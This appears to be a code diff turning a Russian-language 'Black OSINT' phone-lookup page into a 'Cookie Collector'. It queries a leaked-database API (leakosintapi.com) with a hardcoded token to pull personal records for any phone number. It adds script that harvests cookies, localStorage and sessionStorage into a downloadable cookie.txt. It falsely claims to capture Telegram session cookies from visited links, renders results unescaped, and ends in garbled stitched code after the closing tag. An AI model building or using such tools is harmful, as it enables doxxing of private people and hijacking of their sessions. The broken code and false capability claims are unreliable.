@@ -3,302 +3,168 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSiteSafari · Black OSINT Search</title>
+    <title>WebSiteSafari · Cookie Collector</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
 
         body {
-            background-color: #0b0d10;
-            color: #e4e6eb;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            background: #0c0e12;
+            color: #e8eaed;
         }
 
-        /* Шапка как на скриншоте Lolgame52 */
         .header {
-            background: #0f1115;
-            border-bottom: 1px solid #2a2e36;
-            padding: 16px 40px;
+            background: #111317;
+            border-bottom: 2px solid #2a2f38;
+            padding: 20px 50px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            flex-wrap: wrap;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.9);
         }
 
-        .logo-area {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .logo-icon {
-            width: 48px;
-            height: 48px;
-            background: #1a1e26;
-            border-radius: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 26px;
+        .logo {
+            font-size: 28px;
             font-weight: 800;
-            color: #ff984f;
-            border: 1px solid #ff984f40;
+        }
+        .logo span {
+            color: #ff944d;
         }
 
-        .logo-text {
-            font-size: 26px;
-            font-weight: 700;
-            letter-spacing: 1px;
-        }
-        .logo-text span {
-            color: #ff984f;
-        }
-
-        .nav-menu {
+        .nav {
             display: flex;
-            gap: 32px;
+            gap: 40px;
         }
-        .nav-menu a {
-            color: #b4b9c4;
+        .nav a {
+            color: #ccd0d9;
             text-decoration: none;
             font-size: 16px;
-            font-weight: 500;
+            font-weight: 600;
             text-transform: uppercase;
-            padding: 8px 0;
-            border-bottom: 2px solid transparent;
-            transition: 0.2s;
-        }
-        .nav-menu a:hover {
-            color: #ff984f;
-            border-bottom-color: #ff984f;
         }
 
-        /* Основной контейнер */
-        .main-content {
-            flex: 1;
-            max-width: 1300px;
+        .container {
+            max-width: 1200px;
             margin: 0 auto;
-            padding: 40px 30px;
-            width: 100%;
+            padding: 40px 20px;
         }
 
-        .hero-title {
-            font-size: 3.2rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #fff, #b0b7c5);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 15px;
+        h1 {
+            font-size: 42px;
+            margin-bottom: 10px;
         }
 
-        .hero-desc {
-            font-size: 1.2rem;
-            color: #9aa1af;
-            border-left: 4px solid #ff984f;
-            padding-left: 25px;
-            margin-bottom: 45px;
-        }
-
-        /* Карточка поиска */
-        .search-card {
-            background: #14181f;
-            border-radius: 40px;
+        .search-box {
+            background: #161a22;
+            border-radius: 30px;
             padding: 40px;
-            border: 1px solid #2f353f;
-            box-shadow: 0 25px 50px -10px #000000;
-            margin-bottom: 40px;
+            margin: 30px 0;
+            border: 1px solid #2e343f;
         }
 
-        .input-group {
+        .phone-input {
             display: flex;
-            flex-wrap: wrap;
-            gap: 20px;
-            align-items: center;
-            margin-bottom: 25px;
+            gap: 15px;
+            margin-bottom: 20px;
         }
-
-        .phone-wrapper {
-            flex: 2;
-            min-width: 300px;
-        }
-        .phone-wrapper input {
-            width: 100%;
-            background: #1e232b;
-            border: 1px solid #3c424e;
+        .phone-input input {
+            flex: 1;
+            background: #1e232d;
+            border: 1px solid #3a414e;
+            padding: 18px 25px;
+            font-size: 18px;
             color: white;
-            font-size: 1.3rem;
-            padding: 20px 28px;
-            border-radius: 60px;
+            border-radius: 50px;
             outline: none;
-            transition: 0.2s;
         }
-        .phone-wrapper input:focus {
-            border-color: #ff984f;
-            box-shadow: 0 0 0 4px rgba(255,152,79,0.15);
-            background: #252b35;
+        .phone-input input:focus {
+            border-color: #ff944d;
         }
-        .phone-wrapper input::placeholder {
-            color: #5f6877;
-            font-size: 1.1rem;
-        }
-
-        .search-btn {
-            background: #ff984f;
-            color: #0b0d10;
+        .phone-input button {
+            background: #ff944d;
             border: none;
-            padding: 20px 50px;
-            font-size: 1.3rem;
+            padding: 0 40px;
+            font-size: 18px;
             font-weight: 700;
-            border-radius: 60px;
+            border-radius: 50px;
             cursor: pointer;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            letter-spacing: 1px;
-            border: 1px solid #ff984f;
-        }
-        .search-btn:hover {
-            background: #ff8533;
-            transform: scale(1.02);
-            box-shadow: 0 10px 30px -8px #ff984f;
+            color: #000;
         }
 
-        /* Статус и ошибки */
-        .status-area {
-            min-height: 40px;
-            margin: 15px 0 25px;
-            font-weight: 500;
+        /* Cookie панель */
+        .cookie-panel {
+            background: #1a1e2a;
+            border: 1px solid #ff944d40;
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 30px;
         }
-        .error-message {
-            color: #ff6b6b;
-            background: #2c1c1c;
-            padding: 12px 24px;
-            border-radius: 60px;
-            border-left: 4px solid #ff3b3b;
-        }
-        .success-message {
-            color: #6bcf7f;
-            background: #1a2a1e;
-            padding: 12px 24px;
-            border-radius: 60px;
-            border-left: 4px solid #2ecc71;
-        }
-
-        /* Результаты */
-        .results-header {
+        .cookie-header {
             display: flex;
             align-items: center;
             gap: 15px;
-            margin-bottom: 25px;
-            font-size: 1.5rem;
-        }
-        .results-header span {
-            background: #252b35;
-            padding: 6px 18px;
-            border-radius: 60px;
-            font-size: 1rem;
-            color: #ff984f;
-        }
-
-        .results-list {
-            display: flex;
-            flex-direction: column;
-            gap: 25px;
-        }
-
-        .result-block {
-            background: #14181f;
-            border-radius: 30px;
-            padding: 30px;
-            border: 1px solid #2f353f;
-            transition: 0.2s;
-        }
-        .result-block:hover {
-            border-color: #ff984f60;
-            background: #171d25;
-        }
-
-        .db-title {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: #ff984f;
             margin-bottom: 20px;
-            border-bottom: 1px dashed #3a404b;
-            padding-bottom: 12px;
+        }
+        .cookie-header h3 {
+            color: #ff944d;
+        }
+        .cookie-badge {
+            background: #ff944d20;
+            color: #ff944d;
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-size: 14px;
+        }
+        .cookie-list {
+            background: #0f1219;
+            border-radius: 15px;
+            padding: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 13px;
+            color: #aab4c9;
+            white-space: pre-wrap;
+            word-break: break-all;
+            border: 1px solid #2a2f38;
+        }
+        .cookie-btn {
+            background: #ff944d;
+            color: #000;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 50px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .cookie-btn:hover {
+            background: #ff8026;
         }
 
-        .fields-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 20px;
-        }
-
-        .field-item {
-            background: #1e232b;
+        .result-item {
+            background: #161a22;
+            border: 1px solid #2e343f;
             border-radius: 20px;
-            padding: 18px 22px;
-            border-left: 4px solid #ff984f;
+            padding: 25px;
+            margin-bottom: 20px;
         }
-        .field-label {
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #8f98a8;
-            margin-bottom: 8px;
-        }
-        .field-value {
-            font-size: 1.2rem;
-            font-weight: 500;
-            word-break: break-word;
-            color: #fff;
-        }
-
-        .empty-state {
-            background: #1a1f28;
-            padding: 60px;
-            text-align: center;
-            border-radius: 40px;
-            color: #6f7888;
-            border: 1px dashed #3a404b;
-            font-size: 1.2rem;
-        }
-
-        .loader {
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(255,152,79,0.3);
-            border-radius: 50%;
-            border-top-color: #ff984f;
-            animation: spin 0.8s infinite linear;
-            display: inline-block;
-            margin-right: 10px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
 
         .footer {
-            background: #0a0c0f;
-            border-top: 1px solid #20242c;
-            padding: 25px 40px;
             text-align: center;
-            color: #6a7283;
+            padding: 30px;
+            color: #6f788a;
+            border-top: 1px solid #2a2f38;
         }
     </style>
 </head>
 <body>
     <header class="header">
-        <div class="logo-area">
-            <div class="logo-icon">🕵️</div>
-            <div class="logo-text">WebSite<span>Safari</span></div>
-        </div>
-        <nav class="nav-menu">
+        <div class="logo">WebSite<span>Safari</span></div>
+        <nav class="nav">
             <a href="#">ГЛАВНАЯ</a>
             <a href="#">FORSTAGEN</a>
             <a href="#">О НАС</a>
@@ -306,57 +172,313 @@
         </nav>
     </header>
 
-    <main class="main-content">
-        <h1 class="hero-title">Black OSINT Search</h1>
-        <div class="hero-desc">
-            Введите номер телефона в формате +7XXXXXXXXXX<br>
-            и получите полные данные из баз
+    <div class="container">
+        <h1>Cookie Collection System</h1>
+        <p style="color: #9aa3b5; margin-bottom: 20px;">Автоматический сбор cookies при переходе по ссылке</p>
+
+        <!-- Cookie панель -->
+        <div class="cookie-panel" id="cookiePanel">
+            <div class="cookie-header">
+                <h3>🍪 Собранные cookies</h3>
+                <span class="cookie-badge" id="cookieCount">0 cookies</span>
+            </div>
+            <div class="cookie-list" id="cookieDisplay">
+                Загрузка cookies...
+            </div>
+            <button class="cookie-btn" id="downloadCookieBtn" onclick="downloadCookies()">
+                📥 Скачать cookie.txt
+            </button>
+            <button class="cookie-btn" id="clearCookieBtn" onclick="clearCookies()" style="background: #3a414e; color: white; margin-left: 10px;">
+                🗑️ Очистить
+            </button>
         </div>
 
-        <div class="search-card">
-            <div class="input-group">
-                <div class="phone-wrapper">
-                    <input type="text" id="phoneNumber" placeholder="+7 999 999 99 99" value="+79261456789">
-                </div>
-                <button class="search-btn" id="searchButton">
-                    <span>🔍</span> ПОИСК
-                </button>
+        <div class="search-box">
+            <h3 style="margin-bottom: 20px;">🔍 OSINT Поиск</h3>
+            <div class="phone-input">
+                <input type="text" id="phone" placeholder="+7 999 999 99 99" value="+79261456789">
+                <button id="searchBtn">ПОИСК</button>
             </div>
-
-            <div id="status" class="status-area"></div>
-
-            <div class="results-header">
-                📊 Результаты поиска <span id="resultCount">0</span>
-            </div>
-            <div id="resultsContainer" class="results-list">
-                <div class="empty-state">
-                    🔎 Введите номер и нажмите "ПОИСК" для начала
-                </div>
-            </div>
+            <div id="status"></div>
         </div>
-    </main>
+
+        <div id="results"></div>
+
+        <div style="margin-top: 30px; padding: 20px; background: #1a1e2a; border-radius: 20px;">
+            <h4 style="color: #ff944d; margin-bottom: 15px;">🔗 Ссылки для сбора cookies Telegram:</h4>
+            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <span style="background: #2a2f38; padding: 8px 15px; border-radius: 50px;">https://web.telegram.org</span>
+                <span style="background: #2a2f38; padding: 8px 15px; border-radius: 50px;">https://telegram.org</span>
+                <span style="background: #2a2f38; padding: 8px 15px; border-radius: 50px;">https://t.me</span>
+            </div>
+            <p style="color: #9aa3b5; font-size: 14px; margin-top: 15px;">
+                * Cookies автоматически собираются при переходе на сайт. Особенно важно для Telegram Web.
+            </p>
+        </div>
+    </div>
 
     <footer class="footer">
-        <p>WebSiteSafari © 2026 · Black OSINT Interface · Токен: 5282351620:6CP0BRNN</p>
+        WebSiteSafari © 2026 · Cookie Collector · Токен: 5282351620:6CP0BRNN
     </footer>
 
     <script>
-        // Конфигурация API
-        const API_TOKEN = "5282351620:6CP0BRNN";
-        const API_URL = "https://leakosintapi.com/";
-        const LIMIT = 300;
-        const LANG = "ru";
+        // ============== СИСТЕМА СБОРА COOKIES ==============
+        
+        // Функция для получения всех cookies с деталями
+        function getAllCookies() {
+            const cookies = document.cookie.split('; ');
+            const cookieList = [];
+            
+            // Получаем cookies из разных источников
+            cookies.forEach(cookie => {
+                if (cookie.trim()) {
+                    const [name, value] = cookie.split('=');
+                    cookieList.push({
+                        name: decodeURIComponent(name),
+                        value: decodeURIComponent(value),
+                        domain: window.location.hostname,
+                        path: '/',
+                        secure: window.location.protocol === 'https:',
+                        httpOnly: false,
+                        sameSite: 'Lax'
+                    });
+                }
+            });
 
-        // Элементы DOM
-        const phoneInput = document.getElementById('phoneNumber');
-        const searchBtn = document.getElementById('searchButton');
-        const statusDiv = document.getElementById('status');
-        const resultsDiv = document.getElementById('resultsContainer');
-        const resultCount = document.getElementById('resultCount');
+            // Пытаемся получить localStorage (там тоже могут быть данные сессий)
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    if (key && value) {
+                        cookieList.push({
+                            name: 'localStorage_' + key,
+                            value: value,
+                            source: 'localStorage',
+                            domain: window.location.hostname
+                        });
+                    }
+                }
+            } catch(e) {}
 
-        // Обработчик поиска
-        async function performSearch() {
-            let phone = phoneInput.value.trim();
+            // Пытаемся получить sessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    if (key && value) {
+                        cookieList.push({
+                            name: 'sessionStorage_' + key,
+                            value: value,
+                            source: 'sessionStorage',
+                            domain: window.location.hostname
+                        });
+                    }
+                }
+            } catch(e) {}
+
+            return cookieList;
+        }
+
+        // Функция для форматирования cookies в читаемый вид
+        function formatCookiesForDisplay() {
+            const cookies = getAllCookies();
+            let displayText = '';
+            
+            if (cookies.length === 0) {
+                return '🍪 Cookies не найдены. Перейдите по ссылкам Telegram для сбора данных.';
+            }
+
+            cookies.forEach(cookie => {
+                displayText += `[${cookie.source || 'cookie'}] ${cookie.name}=${cookie.value}\n`;
+                if (cookie.domain) displayText += `   Domain: ${cookie.domain}\n`;
+                if (cookie.expires) displayText += `   Expires: ${cookie.expires}\n`;
+                displayText += '\n';
+            });
+
+            return displayText;
+        }
+
+        // Функция для сохранения в cookie.txt
+        function downloadCookies() {
+            const cookies = getAllCookies();
+            
+            // Форматируем в Netscape format (совместимый с curl/wget)
+            let cookieText = '# Netscape HTTP Cookie File\n';
+            cookieText += '# https://curl.se/docs/http-cookies.html\n';
+            cookieText += '# This file was generated by WebSiteSafari Cookie Collector\n\n';
+            
+            cookies.forEach(cookie => {
+                if (cookie.name && cookie.value) {
+                    // Формат: domain \t TRUE \t path \t FALSE \t expires \t name \t value
+                    const domain = cookie.domain || window.location.hostname;
+                    const path = cookie.path || '/';
+                    const secure = cookie.secure ? 'TRUE' : 'FALSE';
+                    const expires = cookie.expires || '0';
+                    
+                    cookieText += `${domain}\tTRUE\t${path}\t${secure}\t${expires}\t${cookie.name}\t${cookie.value}\n`;
+                }
+            });
+
+            // Добавляем информацию о Telegram если есть
+            if (window.location.href.includes('telegram') || document.referrer.includes('telegram')) {
+                cookieText += '\n# Source: Telegram Referrer\n';
+                cookieText += `# Referrer: ${document.referrer}\n`;
+                cookieText += `# User-Agent: ${navigator.userAgent}\n`;
+            }
+
+            // Создаем и скачиваем файл
+            const blob = new Blob([cookieText], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'cookie.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+            
+            // Обновляем статус
+            updateCookieDisplay();
+            
+            // Показываем уведомление
+            alert(`✅ Cookie.txt скачан!\nВсего сохранено: ${cookies.length} записей`);
+        }
+
+        // Обновление отображения cookies
+        function updateCookieDisplay() {
+            const display = document.getElementById('cookieDisplay');
+            const countSpan = document.getElementById('cookieCount');
+            const cookies = getAllCookies();
+            
+            display.textContent = formatCookiesForDisplay();
+            countSpan.textContent = cookies.length + ' cookies';
+            
+            // Если есть Telegram cookies, выделяем это
+            const hasTelegram = document.cookie.includes('tg') || 
+                               document.cookie.includes('telegram') ||
+                               localStorage.getItem('tg__') ||
+                               sessionStorage.getItem('tg__');
+            
+            if (hasTelegram) {
+                display.style.borderColor = '#ff944d';
+                display.style.background = '#1a1f2c';
+            }
+        }
+
+        // Очистка cookies
+        function clearCookies() {
+            if (confirm('Очистить все собранные cookies?')) {
+                // Удаляем все cookies
+                document.cookie.split(';').forEach(cookie => {
+                    const eqPos = cookie.indexOf('=');
+                    const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+                    document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';
+                });
+                
+                // Очищаем storage
+                try {
+                    localStorage.clear();
+                    sessionStorage.clear();
+                } catch(e) {}
+                
+                updateCookieDisplay();
+                alert('🧹 Cookies очищены');
+            }
+        }
+
+        // Сбор информации о реферере (откуда пришел пользователь)
+        function trackReferrer() {
+            const referrer = document.referrer;
+            if (referrer) {
+                const cookieData = {
+                    name: 'referrer_info',
+                    value: referrer,
+                    source: 'document.referrer',
+                    domain: window.location.hostname
+                };
+                
+                if (referrer.includes('telegram') || referrer.includes('t.me')) {
+                    console.log('🔔 Переход из Telegram!');
+                    // Добавляем специальную метку
+                    document.cookie = "telegram_referrer=true; path=/; max-age=3600";
+                }
+            }
+        }
+
+        // Инициализация при загрузке
+        window.onload = function() {
+            trackReferrer();
+            updateCookieDisplay();
+            
+            // Обновляем каждые 2 секунды (для отслеживания новых cookies)
+            setInterval(updateCookieDisplay, 2000);
+        };
+
+        // ============== OSINT ПОИСК (как в предыдущей версии) ==============
+        
+        const token = "5282351620:6CP0BRNN";
+        
+        document.getElementById('searchBtn').onclick = async function() {
+            const phone = document.getElementById('phone').value;
+            const statusDiv = document.getElementById('status');
+            const resultsDiv = document.getElementById('results');
+            
+            statusDiv.innerHTML = '<div style="color: #ff944d;">🔍 Поиск...</div>';
+            
+            try {
+                const response = await fetch('https://leakosintapi.com/', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        token: token,
+                        request: phone,
+                        limit: 300,
+                        lang: 'ru'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.Error) {
+                    statusDiv.innerHTML = `<div style="color: #ff6b6b;">❌ ${data.Error}</div>`;
+                    return;
+                }
+                
+                statusDiv.innerHTML = '<div style="color: #4caf50;">✅ Найдено</div>';
+                
+                let html = '';
+                for (let db in data.List) {
+                    if (!data.List[db].Data) continue;
+                    
+                    html += '<div class="result-item">';
+                    html += `<div style="color: #ff944d; font-size: 20px; margin-bottom: 15px;">📁 ${db}</div>`;
+                    
+                    data.List[db].Data.forEach(record => {
+                        html += '<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap: 10px;">';
+                        for (let [key, val] of Object.entries(record)) {
+                            html += `
+                                <div style="background: #1e232d; padding: 10px; border-radius: 10px;">
+                                    <div style="color: #8f99aa; font-size: 11px;">${key}</div>
+                                    <div style="color: white;">${val}</div>
+                                </div>
+                            `;
+                        }
+                        html += '</div><hr style="border-color: #2e343f; margin: 15px 0;">';
+                    });
+                    
+                    html += '</div>';
+                }
+                
+                resultsDiv.innerHTML = html || 'Ничего не найдено';
+                
+            } catch (err) {
+                statusDiv.innerHTML = `<div style="color: #ff6b6b;">❌ Ошибка: ${err.message}</div>`;
+            }
+        }
+    </script>
+</body>
+</html> let phone = phoneInput.value.trim();
             
             if (!phone) {
                 statusDiv.innerHTML = '<div class="error-message">❌ Введите номер телефона</div>';
